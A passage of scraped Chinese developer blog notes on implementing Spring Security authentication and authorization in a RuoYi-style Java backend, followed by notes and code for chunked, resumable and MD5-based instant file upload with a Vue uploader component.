HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } ResourcesConfig 跨域过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration public class ResourcesConfig implements WebMvcConfigurer { /** * 跨域配置 */ @Bean public CorsFilter corsFilter() { CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); // 设置访问源地址 config.addAllowedOriginPattern(\u0026#34;*\u0026#34;); // 设置访问源请求头 config.addAllowedHeader(\u0026#34;*\u0026#34;); // 设置访问源请求方法 config.addAllowedMethod(\u0026#34;*\u0026#34;); // 有效期 1800秒 config.setMaxAge(1800L); // 添加映射路径，拦截一切请求 UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\u0026#34;/**\u0026#34;, config); // 返回新的CorsFilter return new CorsFilter(source); } } PermitAllUrlProperties 设置Anonymous注解允许匿名访问的url\n参考链接：\nApplicationContextAware接口的作用\n这个接口其实就是获取Spring容器的Bean，在我们写一些框架代码时，或者是看一些框架源码时经常会看到这个接口ApplicationContextAware 的使用，Spring容器会检测容器中的所有Bean，如果发现某个Bean实现了ApplicationContextAware接口，Spring容器会在创建该Bean之后，自动调用该Bean的setApplicationContextAware()方法，调用该方法时，会将容器本身作为参数传给该方法——该方法中的实现部分将Spring传入的参数（容器本身）赋给该类对象的applicationContext实例变量，因此接下来可以通过该applicationContext实例变量来访问容器本身\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @Configuration public class PermitAllUrlProperties implements InitializingBean, ApplicationContextAware { private static final Pattern PATTERN = Pattern.compile(\u0026#34;\\\\{(.*?)\\\\}\u0026#34;); private ApplicationContext applicationContext; private List\u0026lt;String\u0026gt; urls = new ArrayList\u0026lt;\u0026gt;(); public String ASTERISK = \u0026#34;*\u0026#34;; @Override public void afterPropertiesSet() { RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class); Map\u0026lt;RequestMappingInfo, HandlerMethod\u0026gt; map = mapping.getHandlerMethods(); map.keySet().forEach(info -\u0026gt; { HandlerMethod handlerMethod = map.get(info); // 获取方法上边的注解 替代path variable 为 * Anonymous method = AnnotationUtils.findAnnotation(handlerMethod.getMethod(), Anonymous.class); Optional.ofNullable(method).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); // 获取类上边的注解, 替代path variable 为 * Anonymous controller = AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), Anonymous.class); Optional.ofNullable(controller).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); }); } @Override public void setApplicationContext(ApplicationContext context) throws BeansException { this.applicationContext = context; } public List\u0026lt;String\u0026gt; getUrls() { return urls; } public void setUrls(List\u0026lt;String\u0026gt; urls) { this.urls = urls; } } 4.登录模块 authenticationManager.authenticate 会调用 UserDetailsServiceImpl.loadUserByUsername 进行身份认证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public String login(String username, String password, String code, String uuid) { // boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (false) { // validateCaptcha(username, code, uuid); } // 用户验证 Authentication authentication = null; try { UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername authentication = authenticationManager.authenticate(authenticationToken); } catch (Exception e) { if (e instanceof BadCredentialsException) { String message = MessageUtils.message(\u0026#34;user.password.not.match\u0026#34;); asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, message); throw new ServiceException(message); } else { asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, e.getMessage()); throw new ServiceException(e.getMessage()); } } asyncService.recordLogininfor(username, Constants.LOGIN_SUCCESS, MessageUtils.message(\u0026#34;user.login.success\u0026#34;)); LoginUser loginUser = (LoginUser) authentication.getPrincipal(); recordLoginInfo(loginUser.getUserId()); // 生成token return tokenService.createToken(loginUser); } 5.登出模块 SecurityConfig中添加登出过滤链\n1 2 // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); LogoutSuccessHandlerImpl自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } 6.注册模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public String register(RegisterDTO registerBody) { String msg = \u0026#34;\u0026#34;, username = registerBody.getUsername(), password = registerBody.getPassword(); boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (captchaEnabled) { // validateCaptcha(username, registerBody.getCode(), registerBody.getUuid()); } if (StringUtils.isEmpty(username)) { msg = \u0026#34;用户名不能为空\u0026#34;; } else if (StringUtils.isEmpty(password)) { msg = \u0026#34;用户密码不能为空\u0026#34;; } else if (username.length() \u0026lt; UserConstants.USERNAME_MIN_LENGTH || username.length() \u0026gt; UserConstants.USERNAME_MAX_LENGTH) { msg = \u0026#34;账户长度必须在2到20个字符之间\u0026#34;; } else if (password.length() \u0026lt; UserConstants.PASSWORD_MIN_LENGTH || password.length() \u0026gt; UserConstants.PASSWORD_MAX_LENGTH) { msg = \u0026#34;密码长度必须在5到20个字符之间\u0026#34;; } else if (UserConstants.NOT_UNIQUE.equals(userService.checkUserNameUnique(username))) { msg = \u0026#34;保存用户\u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;失败，注册账号已存在\u0026#34;; } else { SysUser sysUser = new SysUser(); sysUser.setUserName(username); sysUser.setPassword(SecurityUtils.encryptPassword(registerBody.getPassword())); boolean regFlag = userService.registerUser(sysUser); if (!regFlag) { msg = \u0026#34;注册失败,请联系系统管理人员\u0026#34;; } else { asyncService.recordLogininfor(username, Constants.REGISTER, MessageUtils.message(\u0026#34;user.register.success\u0026#34;)); } } return msg; } 授权实现 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 -- ---------------------------- -- 角色信息表 -- ---------------------------- drop table if exists sys_role; create table sys_role ( role_id bigint(20) not null auto_increment comment \u0026#39;角色ID\u0026#39;, role_name varchar(30) not null comment \u0026#39;角色名称\u0026#39;, role_key varchar(100) not null comment \u0026#39;角色权限字符串\u0026#39;, role_sort int(4) not null comment \u0026#39;显示顺序\u0026#39;, data_scope char(1) default \u0026#39;1\u0026#39; comment \u0026#39;数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）\u0026#39;, menu_check_strictly tinyint(1) default 1 comment \u0026#39;菜单树选择项是否关联显示\u0026#39;, dept_check_strictly tinyint(1) default 1 comment \u0026#39;部门树选择项是否关联显示\u0026#39;, status char(1) not null comment \u0026#39;角色状态（0正常 1停用）\u0026#39;, del_flag char(1) default \u0026#39;0\u0026#39; comment \u0026#39;删除标志（0代表存在 2代表删除）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (role_id) ) engine=innodb auto_increment=100 comment = \u0026#39;角色信息表\u0026#39;; -- ---------------------------- -- 菜单权限表 -- ---------------------------- drop table if exists sys_menu; create table sys_menu ( menu_id bigint(20) not null auto_increment comment \u0026#39;菜单ID\u0026#39;, menu_name varchar(50) not null comment \u0026#39;菜单名称\u0026#39;, parent_id bigint(20) default 0 comment \u0026#39;父菜单ID\u0026#39;, order_num int(4) default 0 comment \u0026#39;显示顺序\u0026#39;, path varchar(200) default \u0026#39;\u0026#39; comment \u0026#39;路由地址\u0026#39;, component varchar(255) default null comment \u0026#39;组件路径\u0026#39;, query varchar(255) default null comment \u0026#39;路由参数\u0026#39;, is_frame int(1) default 1 comment \u0026#39;是否为外链（0是 1否）\u0026#39;, is_cache int(1) default 0 comment \u0026#39;是否缓存（0缓存 1不缓存）\u0026#39;, menu_type char(1) default \u0026#39;\u0026#39; comment \u0026#39;菜单类型（M目录 C菜单 F按钮）\u0026#39;, visible char(1) default 0 comment \u0026#39;菜单状态（0显示 1隐藏）\u0026#39;, status char(1) default 0 comment \u0026#39;菜单状态（0正常 1停用）\u0026#39;, perms varchar(100) default null comment \u0026#39;权限标识\u0026#39;, icon varchar(100) default \u0026#39;#\u0026#39; comment \u0026#39;菜单图标\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注\u0026#39;, primary key (menu_id) ) engine=innodb auto_increment=2000 comment = \u0026#39;菜单权限表\u0026#39;; -- ---------------------------- -- 角色和菜单关联表 角色1-N菜单 -- ---------------------------- drop table if exists sys_role_menu; create table sys_role_menu ( role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, menu_id bigint(20) not null comment \u0026#39;菜单ID\u0026#39;, primary key(role_id, menu_id) ) engine=innodb comment = \u0026#39;角色和菜单关联表\u0026#39;; -- ---------------------------- -- 用户和角色关联表 用户N-1角色 -- ---------------------------- drop table if exists sys_user_role; create table sys_user_role ( user_id bigint(20) not null comment \u0026#39;用户ID\u0026#39;, role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, primary key(user_id, role_id) ) engine=innodb comment = \u0026#39;用户和角色关联表\u0026#39;; 2.权限过滤器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 3.登录时权限赋值 在 UserDetailsServiceImpl 的 loadUserByUsername 中为user赋上权限\n4.权限查询Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;select id=\u0026#34;selectMenuListByUserId\u0026#34; parameterType=\u0026#34;SysMenu\u0026#34; resultMap=\u0026#34;SysMenuResult\u0026#34;\u0026gt; select distinct m.menu_id, m.parent_id, m.menu_name, m.path, m.component, m.`query`, m.visible, m.status, ifnull(m.perms,\u0026#39;\u0026#39;) as perms, m.is_frame, m.is_cache, m.menu_type, m.icon, m.order_num, m.create_time from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role ro on ur.role_id = ro.role_id where ur.user_id = #{params.userId} \u0026lt;if test=\u0026#34;menuName != null and menuName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.menu_name like concat(\u0026#39;%\u0026#39;, #{menuName}, \u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;visible != null and visible != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.visible = #{visible} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null and status != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.status = #{status} \u0026lt;/if\u0026gt; order by m.parent_id, m.order_num \u0026lt;/select\u0026gt; 5.自定义权限方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService { /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } } 6.接口实现 1 2 3 4 5 6 7 8 9 10 /** * 获取菜单列表 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } ","permalink":"https://chance7bin.github.io/posts/note/spring-security/","summary":"参考链接： https://blog.csdn.net/liuminglei1987/category_10122574.html 从零搭建若依(Ruoyi-Vue)管理系统(10)\u0026ndash;Spring Security核心内容梳理 SpringSecuri","title":"Spring Security"},{"content":" 本篇文章主要内容是分片上传、断点续传、秒传的实现思路\n前言 分片： 分片任务是在前端由vue-simple-uploader插件完成，流程：1.前端先发送check-file（检查文件MD5）来确认文件是直接秒传还是分片上传，如果计算出文件所有片已经上传完成，则启用秒传（秒传就是不传），如果是新文件，则需要分片上传，由vue-simple-uploader插件将文件按固定大小进行切割，然后逐片上传。\n断点续传： 意思就是一个大文件分了多少片，这些片已经上传了哪些，还有哪些没上传，这些都会记录在文件存储目录下的.conf文件中，当你上传大文件时，传一部分后刷新浏览器或关闭浏览器，这时候传输会中断，然后你再打开页面重新上传该文件，它会先检测还有哪些片没有上传，然后直接上传的上次未传的片，这就是断点续传。\n**秒传：**文件不经过上传的步骤，直接将文件信息保存在服务器中。通过计算文件md5实现\n流程 校验文件上传状态： 前端生成该文件的MD5密文并进行分片，上传之前请求check-md5接口，传入文件名和密文，接口校验文件是未上传 或 上传了一部分 或 已上传完成三个状态，其中未上传返回自定义状态码404，上传一部分则返回状态206+未上传的分片ID，上传完成则返回状态200。 前端逐片上传： 校验完成后，根据校验结果对未上传的分片进行逐个上传，上传分片时参数主要是：总片数、当前片ID、片文件 上传接口： 上传接口会先去获取并解析该文件的conf文件（conf文件是RandomAccessFile，该类是通过提供指针的方式操作文件，文件存储的是一个二进制数组，所以可以用来数组下标标记片ID），使用setLength方法设置conf文件长度，使用seek方法跳到当前上传的片ID的位置，把该位置的值替换成127，然后将该分片使用指针偏移的方式插入到_tmp临时文件（临时文件也是RandomAccessFile文件）中，然后校验是否所有的片都上传完成，是则修改临时文件为正式文件名，至此上传完成，否则直接返回该分片上传完成 上传进度： 前端收到当前片的响应结果后，会根据已上传片数量获取到上传进度 MD5的用法： 用于计算服务器是否已经存在相同md5的文件，用作秒传功能的实现。前端计算文件md5，传入后端进行查找是否已经有相同md5文件，若存在直接返回上传成功，否则走上传的步骤 后端接口 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 /** * 检查文件MD5（文件MD5若已存在进行秒传） * * @param md5 md5 * @param fileName 文件名称 * @return {@link ApiResponse} * @author 7bin **/ @GetMapping(value = \u0026#34;/check\u0026#34;) public ApiResponse checkFileMd5(String md5, String fileName) { // Result result = fileService.checkFileMd5(md5, fileName); // return NovelWebUtils.forReturn(result); return ApiResponse.success(); } /** * 断点续传方式上传文件：用于大文件上传 * * @param chunkDTO 参数 * @param request 请求 * @return {@link ApiResponse} * @author 7bin **/ @PostMapping(value = \u0026#34;/breakpoint-upload\u0026#34;, consumes = \u0026#34;multipart/*\u0026#34;, headers = \u0026#34;content-type=multipart/form-data\u0026#34;, produces = \u0026#34;application/json;charset=UTF-8\u0026#34;) public ApiResponse breakpointResumeUpload(Chunk chunkDTO, HttpServletRequest request) { String id = chunkDTO.getIdentifier(); int chunks = Math.toIntExact(chunkDTO.getTotalChunks()); int chunk = chunkDTO.getChunkNumber() - 1; long size = chunkDTO.getCurrentChunkSize(); String name = chunkDTO.getFilename(); MultipartFile file = chunkDTO.getFile(); String md5 = chunkDTO.getIdentifier(); UploadFileParam param = new UploadFileParam(id, chunks, chunk, size, name, file, md5); // return ApiResponse.success(); Result result = fileService.breakpointResumeUpload(param, request); return NovelWebUtils.forReturn(result); } /** * 检查文件MD5（文件MD5若已存在进行秒传） * @param chunkMap * @return {@link ApiResponse} * @author 7bin **/ @GetMapping(value = \u0026#34;/breakpoint-upload\u0026#34;) public ApiResponse breakpointResumeUploadPre( @RequestParam Map\u0026lt;String, String\u0026gt; chunkMap) { String md5 = chunkMap.get(\u0026#34;identifier\u0026#34;); String filename = chunkMap.get(\u0026#34;filename\u0026#34;); Result\u0026lt;JSONArray\u0026gt; result = fileService.checkFileMd5(md5, filename); JSONObject res = new JSONObject(); // 数据库中存在该md5则秒传 if (result == null){ res.put(\u0026#34;skipUpload\u0026#34;,true); return ApiResponse.success(res); } boolean skipUpload = false; if (\u0026#34;200\u0026#34;.equals(result.getCode()) || \u0026#34;201\u0026#34;.equals(result.getCode())) { skipUpload = true; } else if (\u0026#34;206\u0026#34;.equals(result.getCode())) { // 已经上传部分分块 // data中存放的是还未上传的分块 JSONArray data = result.getData(); res.put(\u0026#34;missChunks\u0026#34;,data); } res.put(\u0026#34;skipUpload\u0026#34;,skipUpload); return ApiResponse.success(res); // Result result = fileService.breakpointResumeUpload(param, request); // return NovelWebUtils.forReturn(result); } Service\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 @Override public Result\u0026lt;JSONArray\u0026gt; checkFileMd5(String md5, String fileName) { boolean exist = fileMapper.fileIsExist(md5); if (exist){ return null; } Result\u0026lt;JSONArray\u0026gt; result; try { // String realFilename = md5 + \u0026#34;_\u0026#34; + fileName; String realFilename = md5; result = LocalUpload.checkFileMd5(md5, realFilename, confFilePath, savePath); } catch (Exception e) { // e.printStackTrace(); log.error(e.getMessage()); throw new ServiceException(e.getMessage()); } return result; } @Override public Result breakpointResumeUpload(UploadFileParam param, HttpServletRequest request) { Result result; try { // 这里的 chunkSize(分片大小) 要与前端传过来的大小一致 // long chunkSize = Objects.isNull(param.getChunkSize()) ? 5 * 1024 * 1024 // : param.getChunkSize(); // 实际存储的文件格式为 [{md5}_{filename}] // String realFilename = param.getMd5() + \u0026#34;_\u0026#34; + param.getName(); String realFilename = param.getMd5(); param.setName(realFilename); result = LocalUpload.fragmentFileUploader(param, confFilePath, savePath, 5242880L, request); // return NovelWebUtils.forReturn(result); } catch (Exception e) { log.error(e.getMessage()); throw new ServiceException(e.getMessage()); } return result; } 前端代码 SimpleUploader.vue\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;global-uploader\u0026#34;\u0026gt; \u0026lt;uploader class=\u0026#34;uploader-app\u0026#34; :options=\u0026#34;initOptions\u0026#34; :file-status-text=\u0026#34;fileStatusText\u0026#34; :auto-start=\u0026#34;false\u0026#34; @file-added=\u0026#34;onFileAdded\u0026#34; @file-success=\u0026#34;onFileSuccess\u0026#34; @file-progress=\u0026#34;onFileProgress\u0026#34; @file-error=\u0026#34;onFileError\u0026#34; \u0026gt; \u0026lt;uploader-unsupport\u0026gt;\u0026lt;/uploader-unsupport\u0026gt; \u0026lt;uploader-drop\u0026gt; \u0026lt;uploader-btn \u0026gt;选择文件\u0026lt;/uploader-btn\u0026gt; \u0026lt;span style=\u0026#34;margin-left: 10px\u0026#34;\u0026gt;（支持上传一个或多个文件）\u0026lt;/span\u0026gt; \u0026lt;!--\u0026lt;uploader-btn directory\u0026gt;上传文件夹 \u0026lt;/uploader-btn\u0026gt;--\u0026gt; \u0026lt;/uploader-drop\u0026gt; \u0026lt;!--\u0026lt;uploader-btn id=\u0026#34;global-uploader-btn\u0026#34; ref=\u0026#34;uploadBtnRef\u0026#34;\u0026gt;选择文件\u0026lt;/uploader-btn\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;span\u0026gt;（支持上传一个或多个文件）\u0026lt;/span\u0026gt;--\u0026gt; \u0026lt;uploader-list\u0026gt; \u0026lt;template #default=\u0026#34;{ fileList }\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-panel\u0026#34;\u0026gt; \u0026lt;!--\u0026lt;div class=\u0026#34;file-title\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;文件列表\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/div\u0026gt;--\u0026gt; \u0026lt;ul class=\u0026#34;file-list\u0026#34;\u0026gt; \u0026lt;li v-for=\u0026#34;file in fileList\u0026#34; :key=\u0026#34;file.id\u0026#34; class=\u0026#34;file-item\u0026#34; \u0026gt; \u0026lt;uploader-file ref=\u0026#34;files\u0026#34; :class=\u0026#34;[\u0026#39;file_\u0026#39; + file.id, customStatus]\u0026#34; :file=\u0026#34;file\u0026#34; :list=\u0026#34;true\u0026#34; \u0026gt;\u0026lt;/uploader-file\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;div v-if=\u0026#34;!fileList.length\u0026#34; class=\u0026#34;no-file\u0026#34;\u0026gt; \u0026lt;!--\u0026lt;Icon icon=\u0026#34;ri:file-3-line\u0026#34; width=\u0026#34;16\u0026#34; /\u0026gt; 暂无待上传文件--\u0026gt; 暂无待上传文件 \u0026lt;/div\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/uploader-list\u0026gt; \u0026lt;/uploader\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import useCurrentInstance from \u0026#34;@/utils/currentInstance\u0026#34;; import { generateMD5 } from \u0026#34;@/components/Uploader/utils/md5\u0026#34;; import { ElNotification } from \u0026#34;element-plus\u0026#34;; import { addFileToDrive } from \u0026#34;@/api/drive/drive\u0026#34;; import { checkAuth } from \u0026#34;@/api/admin/user\u0026#34;; const { proxy } = useCurrentInstance(); // TODO 上传组件还有bug 上传成功时动作按钮没有隐藏；后端出现错误上传失败时背景色没变红 // props // emits const emits = defineEmits([\u0026#39;uploadSuccess\u0026#39;]); const drivePath = import.meta.env.VITE_APP_DRIVE_API; const initOptions = { target: drivePath + \u0026#34;/file/breakpoint-upload\u0026#34;, chunkSize: \u0026#39;5242880\u0026#39;, forceChunkSize: true, fileParameterName: \u0026#39;file\u0026#39;, maxChunkRetries: 3, // 是否开启服务器分片校验 testChunks: true, // 服务器分片校验函数，秒传及断点续传基础 checkChunkUploadedByResponse: function (chunk, message) { let skip = false // console.log(\u0026#34;checkChunkUploadedByResponse chunk:\u0026#34;, chunk); // console.log(\u0026#34;checkChunkUploadedByResponse message:\u0026#34;, message); try { let objMessage = JSON.parse(message) // console.log(\u0026#34;objMessage:\u0026#34;, objMessage); if (objMessage.code === 200) { if (objMessage.data.skipUpload) { skip = true } else if (objMessage.data.missChunks == null){ skip = false; } else { skip = (objMessage.data.missChunks || []).indexOf(chunk.offset.toString()) \u0026lt; 0 } } } catch (e) {} // console.log(\u0026#34;skip: \u0026#34; + chunk.offset + \u0026#34; \u0026#34; + skip); return skip }, query: (file, chunk) =\u0026gt; { // console.log(\u0026#34;query:\u0026#34;, file); return { ...file.params } } } const customStatus = ref(\u0026#39;\u0026#39;) const fileStatusText = { success: \u0026#39;上传成功\u0026#39;, error: \u0026#39;上传失败\u0026#39;, uploading: \u0026#39;上传中\u0026#39;, paused: \u0026#39;已暂停\u0026#39;, waiting: \u0026#39;等待上传\u0026#39; } // const uploaderRef = ref() // const uploader = computed(() =\u0026gt; uploaderRef.value?.uploader) async function onFileAdded(file) { // 判断用户是否已经登录了，登录才可以添加 await checkAuth(); // 暂停文件 // 选择文件后暂停文件上传，上传时手动启动 file.pause() // console.log(\u0026#34;onFileAdded file: \u0026#34;, file); // panelShow.value = true // trigger(\u0026#39;fileAdded\u0026#39;) // 将额外的参数赋值到每个文件上，以不同文件使用不同params的需求 // file.params = customParams.value // 计算MD5 const md5 = await computeMD5(file) startUpload(file, md5) } function computeMD5(file) { // 文件状态设为\u0026#34;计算MD5\u0026#34; statusSet(file.id, \u0026#39;md5\u0026#39;) // 计算MD5时隐藏\u0026#34;开始\u0026#34;按钮 nextTick(() =\u0026gt; { // document.querySelector(`.file_${file.id} .uploader-file-resume`).style.display = \u0026#39;none\u0026#39; document.querySelector(`.file_${file.id} .uploader-file-actions`).style.display = \u0026#39;none\u0026#39; }) // 开始计算MD5 return new Promise((resolve, reject) =\u0026gt; { generateMD5(file, { onProgress(currentChunk, chunks) { // 实时展示MD5的计算进度 nextTick(() =\u0026gt; { const md5ProgressText = \u0026#39;校验MD5 \u0026#39; + ((currentChunk / chunks) * 100).toFixed(0) + \u0026#39;%\u0026#39; document.querySelector(`.custom-status-${file.id}`).innerText = md5ProgressText }) }, onSuccess(md5) { statusRemove(file.id) resolve(md5) }, onError() { error(`文件${file.name}读取出错，请检查该文件`) file.cancel() statusRemove(file.id) reject() } }) }) } // md5计算完毕，开始上传 function startUpload(file, md5) { file.uniqueIdentifier = md5 file.resume() } function onFileProgress(rootFile, file, chunk) { console.log( `上传中 ${file.name}，chunk：${chunk.startByte / 1024 / 1024} ~ ${ chunk.endByte / 1024 / 1024 }` ) } const onFileError = (rootFile, file, response, chunk) =\u0026gt; { // console.log(\u0026#39;error\u0026#39;, file) error(response) } function error(msg) { ElNotification({ title: \u0026#39;错误\u0026#39;, message: msg, type: \u0026#39;error\u0026#39;, duration: 2000 }) } const onFileSuccess = (rootFile, file, response, chunk) =\u0026gt; { // console.log(\u0026#34;上传成功\u0026#34;) // console.log(\u0026#34;rootFile\u0026#34;,rootFile) // file的relativePath是文件夹的相对路径(如果上传的是文件夹的话) // console.log(\u0026#34;file\u0026#34;,file) // console.log(\u0026#34;response\u0026#34;,JSON.parse(response)) // 